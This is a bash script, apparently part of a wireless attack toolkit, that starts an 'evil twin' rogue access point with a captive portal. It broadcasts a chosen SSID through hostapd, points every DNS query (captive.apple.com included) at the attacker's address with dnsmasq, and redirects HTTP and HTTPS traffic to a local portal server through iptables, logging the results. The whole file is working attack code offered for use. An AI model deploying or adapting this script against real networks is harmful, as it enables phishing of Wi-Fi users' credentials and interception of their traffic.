#!/usr/bin/env bash

SCRIPT_DIR="$(cd "$(dirname "$(realpath "$0")")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
# scripts/evil_twin.sh
# Evil Twin Access Point with Captive Portal.
#
# Usage:
#   sudo ./scripts/evil_twin.sh start <ssid> [channel]
#   sudo ./scripts/evil_twin.sh stop
#   sudo ./scripts/evil_twin.sh status

MODE="${1:-status}"
SSID="${2:-Free WiFi}"
CHANNEL="${3:-6}"

IFACE="wlan0"
AP_IP="192.168.66.1"
DHCP_RANGE="192.168.66.10,192.168.66.50,255.255.255.0,1h"

# Persistent log in files folder
LOG_FILE="$PROJECT_DIR/menu_fs/04_files/evil_twin_log.jsonl"

HOSTAPD_CONF="/tmp/evil_twin_hostapd.conf"
DNSMASQ_CONF="/tmp/evil_twin_dnsmasq.conf"
HOSTAPD_PID="/tmp/evil_twin_hostapd.pid"
DNSMASQ_PID="/tmp/evil_twin_dnsmasq.pid"

_kill_port80() {
    pkill -f "portal_server.py" 2>/dev/null || true
    lsof -ti:80 | xargs kill -9 2>/dev/null || true
}

_stop() {
    echo "[Evil Twin] Stopping..."
    _kill_port80
    [ -f "$HOSTAPD_PID" ]  && kill "$(cat $HOSTAPD_PID)"  2>/dev/null; rm -f "$HOSTAPD_PID"
    [ -f "$DNSMASQ_PID" ]  && kill "$(cat $DNSMASQ_PID)"  2>/dev/null; rm -f "$DNSMASQ_PID"
    pkill -f "hostapd $HOSTAPD_CONF" 2>/dev/null || true
    sleep 1
    iptables -t nat -F 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    ip link set "$IFACE" down 2>/dev/null || true
    iw dev "$IFACE" set type managed 2>/dev/null || true
    ip link set "$IFACE" up 2>/dev/null || true
    nmcli device set "$IFACE" managed yes 2>/dev/null || true
    systemctl restart NetworkManager 2>/dev/null || true
    echo "[Evil Twin] Stopped."
}

_status() {
    if [ -f "$HOSTAPD_PID" ] && kill -0 "$(cat $HOSTAPD_PID)" 2>/dev/null; then
        echo "running"
    else
        echo "stopped"
    fi
}

_start() {
    echo "[Evil Twin] Starting AP: '$SSID' ch$CHANNEL..."

    # Kill anything on port 80 first
    _kill_port80
    sleep 0.5

    # Disconnect from current network
    nmcli device set "$IFACE" managed no 2>/dev/null || true
    systemctl stop wpa_supplicant 2>/dev/null || true
    ip link set "$IFACE" down
    sleep 0.5
    ip link set "$IFACE" up
    ip addr flush dev "$IFACE"
    ip addr add "$AP_IP/24" dev "$IFACE"

    # hostapd config
    printf "interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%s\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n" \
        "$IFACE" "$SSID" "$CHANNEL" > "$HOSTAPD_CONF"

    hostapd -B -P "$HOSTAPD_PID" "$HOSTAPD_CONF"
    sleep 1

    if ! kill -0 "$(cat $HOSTAPD_PID 2>/dev/null)" 2>/dev/null; then
        echo "[Evil Twin] ERROR: hostapd failed."
        exit 1
    fi

    # dnsmasq — redirect ALL dns including captive.apple.com to us
    cat > "$DNSMASQ_CONF" << DEOF
interface=$IFACE
bind-interfaces
dhcp-range=$DHCP_RANGE
# Redirect all DNS queries (including captive.apple.com) to our IP
address=/#/$AP_IP
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
no-resolv
log-queries=extra
DEOF

    dnsmasq --conf-file="$DNSMASQ_CONF" --pid-file="$DNSMASQ_PID"
    sleep 0.5

    # Redirect HTTP and HTTPS to captive portal
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80  -j DNAT --to-destination "$AP_IP:80"
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j DNAT --to-destination "$AP_IP:80"
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Ensure log dir exists
    mkdir -p "$(dirname $LOG_FILE)"

    echo "[Evil Twin] Running. SSID='$SSID' IP=$AP_IP"
    echo "[Evil Twin] Log: $LOG_FILE"
}

case "$MODE" in
    start)  _start  ;;
    stop)   _stop   ;;
    status) _status ;;
    *) echo "Usage: $0 start <ssid> [channel] | stop | status"; exit 1 ;;
esac
